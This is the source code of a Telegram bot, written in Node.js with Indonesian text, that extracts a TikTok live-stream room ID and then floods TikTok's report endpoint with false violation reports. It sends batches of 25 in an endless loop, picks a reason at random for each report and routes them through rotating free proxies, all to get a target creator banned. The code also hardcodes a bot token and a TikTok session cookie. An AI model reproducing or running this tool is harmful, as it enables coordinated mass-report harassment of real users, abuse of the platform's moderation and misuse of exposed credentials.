const { execSync } = require('child_process');

// Auto-install modul yang diperlukan (menggunakan Axios versi CommonJS yang stabil)
const requiredModules = ['telegraf', 'axios@1.6.8', 'https-proxy-agent'];
for (const mod of requiredModules) {
    const pkgName = mod.split('@')[0];
    try {
        require.resolve(pkgName);
    } catch (e) {
        console.log(`📦 Modul '${pkgName}' belum terinstal. Menginstal...`);
        try {
            execSync(`npm install ${mod}`, { stdio: 'inherit' });
        } catch (errInstall) {}
    }
}

const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const BOT_TOKEN = '9045319876:AAE9I3rNIsnSDfoA66crqraowirf-EFXgJ0';
const ADMIN_CHAT_ID = '8637044889';

const bot = new Telegraf(BOT_TOKEN);

const TIKTOK_COOKIE_STRING = 'delay_guest_mode_vid=5;last_visited_page=%7B%22lastPage%22%3A%22personal_homepage%22%2C%22lastPageAt%22%3A1794762449268%7D;tt-target-idc-sign=TcBVHMnARmnwwLxYi0Os9dJ3Ac_J4kB8Cq3z8IOY_ryZ36lv5NdpEZqEidgKVzgaQ4byVGouUG7xwfENeTZqLnFHdguFj3OpUGt-SrdX3x-TX2v7r4Iox6j0vNPXccRXbOHk3xrEiuUTZGNxi2CmpYsbw68sxgViAL-DYF3coMj7OEz0ijb27LGPVZit6-_eUXBQLbvOukLOOYt5g7-yaxFt_PbdheatZZDkwIR94Z0_bkdDBxYxPGqt3Qt7FSBlPavGvZbAZ88cwcL8j-_zRGomwIjMXOOgLn1DfjJzs46BBZYSwcfnntQx8Q1_5PhBxG2iGlwaBwP6V5W4UsPUB1sHeVt_Xm4XWQgog6iG3y6F3lO_dwOpmz0DssWy5tX0HNrjIt1SVL6NCZmIEtacntJh8DxoGTCVZ7JViXQDmEvadiF-l8LduUanYHIJh797uD6sbaXfGRBqrGhfNsnvy3YYY6L5XwEXOTZs6tq4HqqUyj4KqKmHeDIzQrmQyGCT;living_user_id=569851873889;msToken=jEFh4qXUd7dfiAzjk00asGO-1O5HyEcBe9LEHsDlIXsxVD8y9JwFwrs8lo0MVGzx_ioGIdkrmd1cBJWBVxB8YcjxR50HsJe8MPg3U7-cFbK7OCUqMrOCwErIVd34YEHvcBw1tOj99YaNRaf8HCoYyWXd5Gh0vfYtGZOBi1iVFfU=;sessionid=4036734c8e42f869a8126fd6922683ba;sid_tt=4036734c8e42f869a8126fd6922683ba;ttwid=1%7CrJrGEL9OQKKb5ob_qtid6Z7AY8fdLBlZxjSVAMwnHAE%7C1794762442%7Cb1a7bc4dacb1b34354c008b38b339a548323b4e902f77d5cb5afb60ff98b60bb;';

const REASONS = [
    "Aktivitas ilegal dan barang teregulasi",
    "Kekerasan ekstrem",
    "Perilaku kebencian",
    "Konten kekerasan dan mengerikan",
    "Penipuan dan scam",
    "Bunuh diri, mencelakai diri sendiri, atau tindakan berbahaya",
    "Pelecehan atau perundungan",
    "Aktivitas ketelanjangan dan konten seksual",
    "Keselamatan anak di bawah umur",
    "Spam dan keterlibatan palsu",
    "Informasi palsu yang membahayakan",
    "Pelanggaran hak atas kekayaan intelektual"
];

let activeProxies = [];
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function fetchProxyList() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt', { timeout: 8000 });
        if (response.data) {
            const lines = response.data.split('\n');
            activeProxies = lines.map(p => p.trim()).filter(p => p.length > 0 && (p.startsWith('http') || p.includes(':')));
        }
    } catch (error) {}
}

fetchProxyList();
setInterval(fetchProxyList, 30 * 60 * 1000);

function getSystemInfo() {
    const now = new Date();
    return {
        time: new Intl.DateTimeFormat('id-ID', { timeZone: 'Asia/Jakarta', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).format(now),
        date: new Intl.DateTimeFormat('id-ID', { timeZone: 'Asia/Jakarta', weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }).format(now),
        weather: "🌧️ 28°C (Hujan Ringan / Lembab)",
        region: "Indonesia (WIB)"
    };
}

async function getRoomIdDirect(url) {
    try {
        let targetUrl = url.trim();
        if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;

        const parsedUrl = new URL(targetUrl);
        if (parsedUrl.searchParams.has('room_id')) {
            return parsedUrl.searchParams.get('room_id');
        }

        const response = await axios.get(targetUrl, {
            headers: {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
                'Cookie': TIKTOK_COOKIE_STRING,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            },
            maxRedirects: 5,
            timeout: 8000
        });

        const html = response.data;
        const patterns = [
            /"roomId["']?\s*[:=]\s*["']?(\d{15,20})/i,
            /"room_id["']?\s*[:=]\s*["']?(\d{15,20})/i,
            /"webcastRoomId"\s*:\s*"(\d{15,20})"/i,
            /room\/(\d{15,20})/i
        ];

        for (let pattern of patterns) {
            const match = html.match(pattern);
            if (match && match[1]) {
                return match[1];
            }
        }
        return null;
    } catch (e) {
        return null;
    }
}

const mainKeyboard = Markup.keyboard([
    ['🚀 START TEKDWON REPORT', '📊 STATUS EXECUTOR'],
    ['⚙️ INFO SYSTEM & CUACA', '🔥 HELP / PANDUAN']
]).resize();

bot.start((ctx) => {
    const info = getSystemInfo();
    const menuText = `
╔══════════════════════════════╗
║     ⚡ **DGXEONHOZOOMD** ⚡     ║
║    NODE.JS 18 STABLE BAN     ║
╚══════════════════════════════╝

👋 Halo, **Executor DGXEONHOZOOMD**!
📅 Tanggal: \`${info.date}\`
⏰ Waktu WIB: \`${info.time}\`

📌 **Contoh Penggunaan:**
\`/xban https://www.tiktok.com/@kenanakbaikbaikk/live?...\`
    `;
    return ctx.replyWithMarkdown(menuText, mainKeyboard);
});

bot.hears('🚀 START TEKDWON REPORT', (ctx) => {
    return ctx.reply("⚡ **SILAKAN KIRIM PERINTAH:**\nGunakan format berikut dengan link live target:\n`/xban https://www.tiktok.com/@username/live?...`", { parse_mode: 'Markdown', ...mainKeyboard });
});

bot.hears('📊 STATUS EXECUTOR', (ctx) => {
    return ctx.reply(`📊 **STATUS EXECUTOR**\n\n- Engine: **Axios + Cookie Direct (Node.js 18)**\n- Proxy Pool: **${activeProxies.length} Proxies**\n- Cookie Status: **Injected & Active**`, { parse_mode: 'Markdown', ...mainKeyboard });
});

bot.hears('⚙️ INFO SYSTEM & CUACA', (ctx) => {
    const info = getSystemInfo();
    return ctx.reply(`⚙️ **SYSTEM INFO**\n\n⏰ Jam: \`${info.time} WIB\`\n🌤️ Cuaca: \`${info.weather}\``, { parse_mode: 'Markdown', ...mainKeyboard });
});

bot.hears('🔥 HELP / PANDUAN', (ctx) => {
    return ctx.reply(`🔥 **PANDUAN**\n\nKirim perintah \`/xban <link_live_tiktok>\`. Bot mengambil Room ID secara instan dan mengirimkan laporan TOS resmi secara acak dan terus-menerus tanpa henti.`, { parse_mode: 'Markdown', ...mainKeyboard });
});

bot.command('xban', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply("❌ **Format Salah!**\nGunakan contoh:\n`/xban https://www.tiktok.com/@kenanakbaikbaikk/live?...`", { parse_mode: 'Markdown', ...mainKeyboard });
    }

    const liveLink = args[1];
    const statusMsg = await ctx.reply("🔄 **[EXECUTOR]** Mengambil Room ID dari URL Live Streaming...", { parse_mode: 'Markdown' });

    const roomId = await getRoomIdDirect(liveLink);

    if (!roomId) {
        return ctx.telegram.editMessageText(
            ctx.chat.id, 
            statusMsg.message_id, 
            null, 
            "❌ **[ERROR]** Gagal mendapatkan Room ID! Pastikan link live streaming TikTok aktif.", 
            { parse_mode: 'Markdown' }
        );
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id, 
        statusMsg.message_id, 
        null, 
        `✅ **[SUCCESS]** Room ID Ditemukan: \`${roomId}\`\n🔥 **MENJALANKAN LAPORAN RESMI TIKTOK TANPA HENTI...**`, 
        { parse_mode: 'Markdown' }
    );

    setImmediate(async () => {
        let globalCounter = 0;
        
        while (true) {
            const batchPromises = [];

            for (let i = 0; i < 25; i++) {
                globalCounter++;
                const currentId = globalCounter;
                const randomReason = REASONS[Math.floor(Math.random() * REASONS.length)];
                
                let proxyUrl = null;
                if (activeProxies.length > 0) {
                    const rawProxy = activeProxies[Math.floor(Math.random() * activeProxies.length)];
                    proxyUrl = rawProxy.startsWith('http') ? rawProxy : `http://${rawProxy}`;
                }

                const axiosConfig = {
                    headers: {
                        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
                        'Cookie': TIKTOK_COOKIE_STRING,
                        'Content-Type': 'application/json',
                        'Referer': liveLink,
                        'Origin': 'https://www.tiktok.com'
                    },
                    timeout: 4000
                };

                if (proxyUrl) {
                    try {
                        axiosConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
                        axiosConfig.proxy = false;
                    } catch (e) {}
                }

                const payload = {
                    room_id: roomId,
                    report_type: 4,
                    target_type: 1,
                    reason: randomReason,
                    source: "live_stream_report"
                };

                const requestPromise = axios.post(`https://webcast.tiktokv.com/webcast/room/report/?room_id=${roomId}`, payload, axiosConfig)
                .then(() => {
                    console.log(`[OFFICIAL REPORT #${currentId}] Room: ${roomId} | Alasan: ${randomReason} | Status: Terkirim`);
                }).catch(() => {});

                batchPromises.push(requestPromise);
            }

            await Promise.all(batchPromises);
            await sleep(100); 
        }
    });
});

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (reason, promise) => {});

bot.launch().then(() => {
    console.log("🤖 Bot Telegram DGXEONHOZOOMD (Stable Node 18) Berhasil Dijalankan!");
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
